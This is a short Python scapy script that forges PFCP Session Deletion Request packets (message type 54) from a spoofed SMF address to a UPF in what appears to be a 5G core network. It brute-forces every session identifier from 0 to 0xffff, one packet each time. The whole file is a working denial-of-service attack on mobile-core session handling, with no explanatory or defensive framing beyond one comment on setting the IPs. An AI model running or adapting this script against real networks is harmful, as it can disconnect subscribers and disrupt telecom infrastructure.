## Modify tye src and dst IPs from SMF and UPF IPs
from scapy.all import send, IP, UDP
from scapy.contrib.pfcp import PFCP
import time

# Placeholder for IP addresses
src_ip = "10.42.0.19"
dst_ip = "10.42.0.26"

seq = 7000
length = 12

# Loop to send packets with changing SEID values
for seid in range(0x0000, 0xffff + 1):
    packet = IP(src=src_ip, dst=dst_ip, ihl=5, tos=0x0, len=44, id=21679, flags='DF') / \
             UDP(sport=8805, dport=8805, len=24) / \
             PFCP(message_type=54, seid=seid, seq=seq, length=length)
    send(packet)
    time.sleep(0.2)
    print(f"Packet sent with SEID: {hex(seid)}")